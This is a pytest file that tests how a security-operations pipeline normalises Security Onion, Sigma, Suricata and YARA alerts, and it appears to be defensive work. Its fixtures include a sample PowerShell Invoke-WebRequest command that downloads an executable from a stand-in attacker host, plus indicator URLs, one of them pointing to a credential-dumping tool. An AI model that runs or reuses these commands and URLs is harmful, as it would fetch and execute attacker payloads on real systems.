from __future__ import annotations

from alert_builder import build_canonical_alert


def _sigma_raw_alert():
    # Matches the n8n Alert Builder output shape documented in
    # SOC-3s-ARCHITECTURE-v3-final.md §3.
    return {
        "type": "sigma",
        "source": "security-onion",
        "sourceRef": "6qS9fp8BiUkBvoTNPeON",
        "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
        "description": (
            "Detection engine: sigma\n"
            "Rule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\n"
            "Host: win-kvkmd51ggkq (172.20.24.99)\n"
            "Agent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\n"
            "Command line: powershell.exe -c Invoke-WebRequest -Uri https://evil.example/x.exe"
        ),
        "severity": 3,
        "tlp": 2,
        "pap": 2,
        "date": 1784710559000,
        "tags": [
            "172.20.24.99",
            "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
            "engine:sigma",
            "rule:Suspicious Invoke-WebRequest Execution",
            "security-onion",
            "win-kvkmd51ggkq",
        ],
        "observables": [
            {"dataType": "domain", "data": "github.com", "ioc": True},
            {
                "dataType": "url",
                "data": "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe",
                "ioc": True,
            },
            {
                "dataType": "domain",
                "data": "https://evil.example/payload",
                "ioc": True,
            },
            {
                "dataType": "hash",
                "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
                "ioc": True,
                "tags": ["sha256"],
            },
            {
                "dataType": "hash",
                "data": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
                "ioc": False,
                "tags": ["imphash"],
            },
        ],
    }


def _hive_alert():
    return {
        "_id": "~1156182192",
        "observables": [
            {
                "_id": "~506892376",
                "dataType": "hash",
                "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
                "reports": {
                    "VirusTotal_GetReport_3_0": {
                        "summary": {
                            "taxonomies": [
                                {"level": "malicious", "namespace": "VT", "predicate": "detections", "value": "40/70"},
                            ]
                        }
                    }
                },
            },
            {
                "_id": "~506892377",
                "dataType": "domain",
                "data": "github.com",
                "reports": {},
            },
        ],
    }


def test_build_canonical_alert_parses_rule_and_host_from_description():
    alert = build_canonical_alert(_sigma_raw_alert(), None, {}, thehive_alert_id="~1156182192")

    assert alert.alert_id == "~1156182192"
    assert alert.source_engine == "sigma"
    assert alert.investigation_profile == "endpoint_behavior"
    assert alert.rule.name == "Suspicious Invoke-WebRequest Execution"
    assert alert.rule.uuid == "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
    assert alert.rule.native_severity == 3
    assert alert.host.hostname == "win-kvkmd51ggkq"
    assert alert.host.ip == ["172.20.24.99"]
    assert "Invoke-WebRequest" in alert.process.command_line


def _hive_alert_with_iocs():
    # Raw SO alert docs never carry an "observables" list — only TheHive does,
    # after n8n's Alert Builder extracts IOCs and Cortex scores them. This is
    # the real source _build_observables reads from.
    return {
        "_id": "~1156182192",
        "observables": [
            {"_id": "o1", "dataType": "domain", "data": "github.com"},
            {
                "_id": "o2",
                "dataType": "url",
                "data": "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe",
            },
            {"_id": "o3", "dataType": "domain", "data": "https://evil.example/payload"},
            {
                "_id": "o4",
                "dataType": "hash",
                "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
                "tags": ["sha256"],
            },
            {"_id": "o5", "dataType": "hash", "data": "bf7a6e7a62c3f5b2e8e069438ac1dd3d", "tags": ["imphash"]},
        ],
    }


def test_build_canonical_alert_ignores_raw_alert_observables_field():
    # If a caller's raw_alert dict happens to carry an "observables" key anyway
    # (e.g. a differently-shaped payload), it must be ignored — observables only
    # come from hive_alert and raw_alert's own ioc.indicators, never raw_alert.observables.
    alert = build_canonical_alert(_sigma_raw_alert(), None, {})
    assert alert.observables.domains == []
    assert alert.observables.urls == []
    assert alert.observables.hashes.imphash == []


def test_build_canonical_alert_corrects_mislabeled_url_observable():
    alert = build_canonical_alert(
        _sigma_raw_alert(), _hive_alert_with_iocs(), {}, thehive_alert_id="~1156182192"
    )

    # dataType said "domain" but the value starts with https:// — must land in urls, not domains.
    assert "https://evil.example/payload" in alert.observables.urls
    assert "https://evil.example/payload" not in alert.observables.domains
    assert "github.com" in alert.observables.domains
    assert "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94" in alert.observables.hashes.sha256
    assert "bf7a6e7a62c3f5b2e8e069438ac1dd3d" in alert.observables.hashes.imphash


def test_build_canonical_alert_maps_cortex_reports_from_hive_fetch():
    alert = build_canonical_alert(_sigma_raw_alert(), _hive_alert(), {"business_criticity": "high"})

    assert alert.asset_context["business_criticity"] == "high"
    assert alert.thehive_observable_ids["github.com"] == "~506892377"
    assert len(alert.cortex_results) == 1
    result = alert.cortex_results[0]
    assert result.verdict == "malicious"
    assert result.analyzer == "VirusTotal_GetReport_3_0"
    assert result.score == 90


def test_build_canonical_alert_handles_missing_hive_alert():
    alert = build_canonical_alert(_sigma_raw_alert(), None, {})
    assert alert.cortex_results == []
    assert alert.thehive_observable_ids == {}


def test_build_canonical_alert_falls_back_when_description_unparseable():
    raw = {
        "type": "suricata",
        "title": "ET SCAN Possible Nmap",
        "description": "no structured fields here",
        "severity": 2,
        "date": 1784710559000,
        "tags": [],
        # so-ioc-normalize computes this directly on raw_alert, no hive_alert needed.
        "ioc": {"indicators": [{"type": "ip", "value": "203.0.113.5"}]},
    }
    alert = build_canonical_alert(raw, None, {})

    assert alert.source_engine == "suricata"
    assert alert.investigation_profile == "network_threat"
    assert alert.rule.name == "ET SCAN Possible Nmap"
    assert alert.rule.uuid == ""
    assert alert.host is None
    assert "203.0.113.5" in alert.observables.external_ips


# --- Phase A: per-engine structured extraction (SOC-3s-ARCHITECTURE-v3-final.md §5/§13) ---
# Field paths below are hand-built from confirmed live-payload facts and Security
# Onion's own ingest pipelines (so-ingest-reference/), not derived from any single
# captured sample — alert_builder.py must not be designed around just one alert shape.


def _sigma_event_data_alert():
    return {
        "type": "sigma",
        "title": "[HIGH] Suspicious Process - workstation-07",
        "description": (
            "Detection engine: sigma\n"
            "Rule: Suspicious Process (aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee)\n"
            "Host: some-other-hostname (10.0.0.1)\n"
            "Command line: this text must NOT win if event_data is present"
        ),
        "severity": 3,
        "date": 1784710559000,
        "tags": ["engine:sigma"],
        "observables": [],
        "event_data": {
            "host": {"hostname": "workstation-07", "ip": ["172.20.24.50"], "os": {"family": "windows"}},
            "user": {"name": "alice", "id": "S-1-5-21-9999"},
            "process": {
                "name": "cmd.exe",
                "executable": "C:\\Windows\\System32\\cmd.exe",
                "command_line": "cmd.exe /c whoami",
                "pid": 5150,
                "working_directory": "C:\\Users\\alice\\",
                "hash": {"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85", "md5": "d41d8cd98f00b204e9800998ecf8427e"},
                "pe": {"imphash": "0123456789abcdef0123456789abcdef"},
                "parent": {"name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe", "pid": 3300},
            },
        },
    }


def test_build_canonical_alert_prefers_event_data_over_regex():
    alert = build_canonical_alert(_sigma_event_data_alert(), None, {})

    # host/process come from event_data, not the (deliberately conflicting) description text
    assert alert.host.hostname == "workstation-07"
    assert alert.host.ip == ["172.20.24.50"]
    assert alert.user.name == "alice"
    assert alert.user.id == "S-1-5-21-9999"
    assert alert.process.command_line == "cmd.exe /c whoami"
    assert alert.process.name == "cmd.exe"
    assert alert.process.pid == 5150
    assert alert.process.working_directory == "C:\\Users\\alice\\"
    assert alert.process.parent_name == "explorer.exe"
    assert alert.process.parent_command_line == "C:\\Windows\\explorer.exe"
    assert alert.process.parent_pid == 3300
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85" in alert.observables.hashes.sha256
    assert "d41d8cd98f00b204e9800998ecf8427e" in alert.observables.hashes.md5
    assert "0123456789abcdef0123456789abcdef" in alert.observables.hashes.imphash


def test_build_canonical_alert_event_data_missing_fields_stay_none():
    raw = _sigma_event_data_alert()
    del raw["event_data"]["process"]["parent"]
    alert = build_canonical_alert(raw, None, {})

    assert alert.process.parent_name is None
    assert alert.process.parent_command_line is None
    assert alert.process.parent_pid is None


def test_build_canonical_alert_suricata_structured_rule_and_network():
    raw = {
        "type": "suricata",
        "title": "ET SCAN Possible Nmap",
        "description": "no structured description fields here",
        "severity": 2,
        "date": 1784710559000,
        "tags": [],
        "observables": [],
        "rule": {"name": "ET SCAN Possible Nmap", "uuid": "2010665"},
        "source": {"ip": "203.0.113.5", "port": 443},
        "destination": {"ip": "198.51.100.9", "port": 80},
        "network": {"transport": "tcp"},
    }
    alert = build_canonical_alert(raw, None, {})

    assert alert.rule.name == "ET SCAN Possible Nmap"
    assert alert.rule.uuid == "2010665"
    assert alert.network.src_ip == "203.0.113.5"
    assert alert.network.dst_ip == "198.51.100.9"
    assert alert.network.src_port == 443
    assert alert.network.dst_port == 80
    assert alert.network.protocol == "tcp"
    assert alert.process is None
    assert alert.user is None


def test_build_canonical_alert_suricata_string_source_field_does_not_crash():
    """n8n's envelope has a top-level `source` string (source *system*, e.g.
    "security-onion") that collides in name with Suricata's ECS `source` object
    (network source ip/port). Must degrade to "no network data" rather than
    raising AttributeError."""
    raw = {
        "type": "suricata",
        "source": "security-onion",  # string, not a dict — the regression case
        "title": "ET SCAN Possible Nmap",
        "description": "x",
        "severity": 2,
        "date": 1784710559000,
        "tags": [],
        "observables": [],
    }
    alert = build_canonical_alert(raw, None, {})
    assert alert.network is None


def test_build_canonical_alert_yara_structured_rule_and_file():
    raw = {
        "type": "yara",
        "title": "Malicious PE Detected",
        "description": "no structured description fields here",
        "severity": 3,
        "date": 1784710559000,
        "tags": [],
        "rule": {"name": "Malicious_PE_Generic", "uuid": "Malicious_PE_Generic"},
        "file": {
            "name": "invoice.exe",
            "path": "/nsm/strelka/processed/invoice.exe",
        },
        # Security Onion's strelka.file ingest pipeline renames scan.hash to a
        # TOP-LEVEL `hash` field, sibling of `file` — confirmed from so-ingest-reference,
        # NOT nested under file.hash.
        "hash": {"md5": "9e107d9d372bb6826bd81d3542a419d6", "sha256": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"},
    }
    alert = build_canonical_alert(raw, None, {})

    assert alert.rule.name == "Malicious_PE_Generic"
    assert alert.rule.uuid == "Malicious_PE_Generic"  # YARA: uuid == rule name, not a separate ID
    assert alert.file.name == "invoice.exe"
    assert alert.file.path == "/nsm/strelka/processed/invoice.exe"
    assert "9e107d9d372bb6826bd81d3542a419d6" in alert.observables.hashes.md5
    assert "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d" in alert.observables.hashes.sha256
    assert alert.process is None
    assert alert.network is None


def test_build_canonical_alert_yara_hash_nested_under_file_still_works():
    # Defensive fallback: some caller might nest hash under file.hash instead —
    # keep supporting it even though the top-level `hash` field above is primary.
    raw = {
        "type": "yara",
        "title": "Malicious PE Detected",
        "description": "x",
        "severity": 3,
        "date": 1784710559000,
        "tags": [],
        "rule": {"name": "Malicious_PE_Generic", "uuid": "Malicious_PE_Generic"},
        "file": {
            "name": "invoice.exe",
            "hash": {"sha256": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"},
        },
    }
    alert = build_canonical_alert(raw, None, {})
    assert "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d" in alert.observables.hashes.sha256


# --- Real raw Security Onion doc shape (confirmed live payload + so-ioc-normalize /
# securityonion-es.py source) — distinct from the n8n-Alert-Builder-shaped fixtures
# above. This is what actually reaches /triage in production.


def test_build_canonical_alert_real_raw_so_doc_shape():
    raw = {
        "@timestamp": "2026-07-22T08:55:59Z",
        "sigma_level": "high",
        "rule": {
            "product": "windows",
            "name": "Suspicious Invoke-WebRequest Execution",
            "category": "process_creation",
            "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc",
        },
        "event_data": {
            "host": {"name": "win-kvkmd51ggkq", "os": {"type": "windows"}},
            "user": {"name": "Administrator"},
            "process": {"name": "powershell.exe", "pid": 8524, "command_line": "powershell.exe -enc ..."},
        },
        "event": {"severity": 4, "module": "sigma", "dataset": "sigma.alert", "severity_label": "high"},
        "ioc": {"schema_version": "1.0", "source_engine": "sigma", "dataset": "sigma.alert"},
        "tags": "alert",  # a plain string on real docs, not a list — must not crash
        "_id": "6qS9fp8BiUkBvoTNPeON",
        "source_system": "security-onion",
    }
    alert = build_canonical_alert(raw, None, {})

    assert alert.source_engine == "sigma"
    assert alert.investigation_profile == "endpoint_behavior"
    assert alert.rule.name == "Suspicious Invoke-WebRequest Execution"
    assert alert.rule.uuid == "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
    assert alert.rule.native_severity == 4
    assert alert.host.hostname == "win-kvkmd51ggkq"
    assert alert.user.name == "Administrator"
    assert alert.process.pid == 8524
    assert alert.alert_id == "6qS9fp8BiUkBvoTNPeON"
    assert alert.timestamp.year == 2026 and alert.timestamp.month == 7 and alert.timestamp.day == 22


def test_build_canonical_alert_source_engine_falls_back_to_event_module():
    # No ioc.* wrapper (e.g. pipeline hasn't run yet) — event.module is the same
    # value one level up, confirmed via so-ioc-normalize's own source.
    raw = {"rule": {"name": "x", "uuid": "y"}, "event": {"module": "suricata"}}
    alert = build_canonical_alert(raw, None, {})
    assert alert.source_engine == "suricata"
    assert alert.investigation_profile == "network_threat"


def test_build_canonical_alert_native_severity_falls_back_to_event_severity():
    # No top-level `severity` (real raw SO docs don't have one) — event.severity
    # is the cross-engine-normalized field.
    raw = {"rule": {"name": "x", "uuid": "y"}, "event": {"severity": 2}}
    alert = build_canonical_alert(raw, None, {})
    assert alert.rule.native_severity == 2


def test_build_canonical_alert_timestamp_prefers_at_timestamp_over_date():
    raw = {
        "rule": {"name": "x", "uuid": "y"},
        "@timestamp": "2026-01-15T10:30:00Z",
        "date": 1784710559000,  # deliberately different/wrong, must not win
    }
    alert = build_canonical_alert(raw, None, {})
    assert alert.timestamp.year == 2026 and alert.timestamp.month == 1 and alert.timestamp.day == 15
